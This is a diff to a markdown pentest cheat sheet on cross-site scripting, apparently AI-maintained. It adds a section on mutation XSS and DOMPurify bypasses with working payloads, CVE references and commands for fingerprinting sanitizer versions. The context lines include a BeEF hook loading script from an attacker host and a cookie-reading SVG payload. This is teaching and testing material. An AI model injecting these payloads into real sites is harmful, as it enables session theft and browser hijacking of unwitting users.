@@ -1,6 +1,6 @@
 # Cross-Site Scripting (XSS)
 
-#XSS #CrossSiteScripting #StoredXSS #ReflectedXSS #DOMXSS #BlindXSS
+#XSS #CrossSiteScripting #StoredXSS #ReflectedXSS #DOMXSS #BlindXSS #mXSS #CSPBypass #XSStrike #dalfox #XSSHunter #BurpSuite #BeEF #ffuf
 
 ## What is this?
 
@@ -14,11 +14,12 @@ Web app fails to sanitize user input, allowing injection of JavaScript that exec
 
 | Tool | Purpose |
 |---|---|
-| `XSStrike` | Smart XSS scanner — context-aware payload generation |
-| `dalfox` | Fast XSS scanner — parameter analysis + PoC generation |
-| `xsshunter` | Blind XSS callback service — captures cookies/DOM/screenshots |
-| [[Burpsuite]] | Intercept, test, and automate XSS discovery |
-| `BeEF` | Browser exploitation framework — post-XSS browser control |
+| [[Tools/Web/XSStrike\|XSStrike]] | Smart XSS scanner — context-aware payload generation |
+| [[Tools/Web/dalfox\|dalfox]] | Fast XSS scanner — parameter analysis + PoC generation |
+| [[Tools/Web/XSS Hunter\|XSS Hunter]] | Blind XSS callback service — captures cookies/DOM/screenshots |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept, test, and automate XSS discovery (+ DOM Invader) |
+| [[Tools/Web/BeEF\|BeEF]] | Browser exploitation framework — post-XSS browser control |
+| [[Tools/Scanning/ffuf\|ffuf]] | Fuzz parameters and payload lists |
 
 ---
 
@@ -570,6 +571,48 @@ Built into Burp's embedded browser. Automatically:
 
 ---
 
+## Mutation XSS (mXSS) & Sanitizer Bypasses
+
+When the app *does* sanitize properly, the remaining attack is the gap between what the sanitizer parsed and what the browser re-parses on insertion. Feed markup that is inert to the sanitizer's parser but **mutates** into executable markup once the browser re-serialises it into the live DOM.
+
+**Where mutation happens:**
+
+| Trigger | Why it mutates |
+|---|---|
+| Foreign-content boundaries (`<svg>`, `<math>`) | HTML/SVG/MathML parsing rules differ — namespace confusion re-interprets tags on re-parse |
+| Sanitized string re-assigned to `innerHTML` | Second parse of an already-serialised tree can produce a different tree |
+| `<template>` content | Contents are parsed into a separate document fragment with different rules |
+| `noscript` / `style` / `xmp` raw-text elements | Content treated as text in one context, markup in another |
+
+```html
+<!-- Namespace-confusion shape (classic DOMPurify <=2.0.16 mXSS) -->
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
+
+<!-- Form/template re-parse shape -->
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+```
+
+**Named DOMPurify CVEs worth version-checking:**
+
+| CVE | Affects | Condition |
+|---|---|---|
+| CVE-2025-26791 | `< 3.2.4` | Bad template-literal regex when `SAFE_FOR_TEMPLATES: true` → mXSS |
+| CVE-2026-49978 | recent 3.x | `IN_PLACE` sanitization bypass via attached shadow root inside `<template>.content` |
+| CVE-2026-49458 | recent 3.x | Cross-realm `IN_PLACE` sanitization bypass |
+
+```bash
+# Always fingerprint the sanitizer version first — this is the whole attack
+curl -s http://target.com/app.js | grep -oiE 'dompurify[^"]{0,40}'
+# or in the browser console:
+DOMPurify.version
+```
+
+> [!tip] Two config red flags to grep for regardless of version: `SAFE_FOR_TEMPLATES: true` and `IN_PLACE: true`. Also look for the app mutating DOMPurify's output *after* sanitizing (string concat, re-assignment to `innerHTML`) — that reintroduces the mutation the library just prevented.
+
+> [!note] **Trusted Types** (`require-trusted-types-for 'script'` in CSP) is the platform-level fix — it bans raw strings reaching `innerHTML`/`eval` sinks entirely. If the target sets it, DOM XSS via those sinks is dead and you should pivot to reflected/stored server-side contexts instead of burning time on sinks.
+
+---
+
 ## CSP (Content Security Policy) Considerations
 
 ### Checking CSP
@@ -726,14 +769,14 @@ ffuf -w /usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt:FUZZ -
 
 ### Tools
 
-- [[Burpsuite]] - Manual testing, Repeater, Scanner, DOM Invader
-- [XSStrike](https://github.com/s0md3v/XSStrike) - Context-aware fuzzer with payload evaluation
-- [DalFox](https://github.com/hahwul/dalfox) - Fast scanner, blind XSS support
-- [XSS Hunter](https://xsshunter.trufflesecurity.com/) - Blind XSS tracking with screenshots
+- [[Tools/Web/Burpsuite|Burp Suite]] - Manual testing, Repeater, Scanner, DOM Invader
+- [[Tools/Web/XSStrike|XSStrike]] - Context-aware fuzzer with payload evaluation
+- [[Tools/Web/dalfox|DalFox]] - Fast scanner, blind XSS support
+- [[Tools/Web/XSS Hunter|XSS Hunter]] - Blind XSS tracking with screenshots
 - [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) - Brute force XSS scanner
 - [XSSer](https://github.com/epsylon/xsser) - Automated XSS framework
 - DOM Invader (PortSwigger) - DOM XSS in Burp's browser
-- [BeEF](https://github.com/beefproject/beef) - Browser Exploitation Framework — hook browsers, run post-XSS modules
+- [[Tools/Web/BeEF|BeEF]] - Browser Exploitation Framework — hook browsers, run post-XSS modules
 
 **Wordlists:**
 - [XSS-BruteLogic.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt)
@@ -804,7 +847,8 @@ Understanding defenses helps you spot gaps:
 | **HttpOnly Cookies** | Blocks JS cookie access | Can still perform actions as user |
 | **X-XSS-Protection** | Legacy browser filter | Deprecated, unreliable |
 | **WAF** | Pattern-based blocking | Encoding, obfuscation, polyglots |
-| **Sanitization Libraries** | DOMPurify, Bleach, etc. | Usually solid, look for older versions |
+| **Sanitization Libraries** | DOMPurify, Bleach, etc. | Solid when current — check the version and config for known mXSS bypasses (see above) |
+| **Trusted Types** | Bans raw strings at DOM sinks (`innerHTML`, `eval`) | Effectively closes DOM XSS; pivot to server-side contexts |
 
 ---
 
@@ -818,9 +862,9 @@ Understanding defenses helps you spot gaps:
 - [[SQL Injection]] - Sometimes chainable with XSS
 
 **Tools:**
-- [[Burpsuite]] - Manual testing
-- [[ffuf]] - Fuzzing
-- [[gobuster]] - Enumeration
+- [[Tools/Web/Burpsuite|Burp Suite]] - Manual testing
+- [[Tools/Scanning/ffuf|ffuf]] - Fuzzing
+- [[Tools/Scanning/gobuster|gobuster]] - Enumeration
 
 **External:**
 - [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/)
@@ -848,11 +892,13 @@ Understanding defenses helps you spot gaps:
 | Fuzz payloads | `ffuf -w XSS-BruteLogic.txt:FUZZ -u 'http://target.com/?search=FUZZ' -fs 0` |
 | Find DOM sinks in JS | `curl -s http://target.com/app.js \| grep -iE '(innerHTML\|document\.write\|eval\(\|\.html\()'` |
 | CSP check | `curl -sI http://target.com \| grep -i content-security-policy` |
+| Sanitizer version check | `DOMPurify.version` in console / `grep -oiE 'dompurify[^"]{0,40}' app.js` |
+| mXSS namespace confusion | `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">` |
 | Hook browser (BeEF) | `<script src="http://<AttackerIP>:3000/hook.js"></script>` |
 | SVG upload XSS | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>` |
 
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-27*
-*Model: claude-sonnet-5*
+*Updated: 2026-07-30*
+*Model: claude-opus-5*
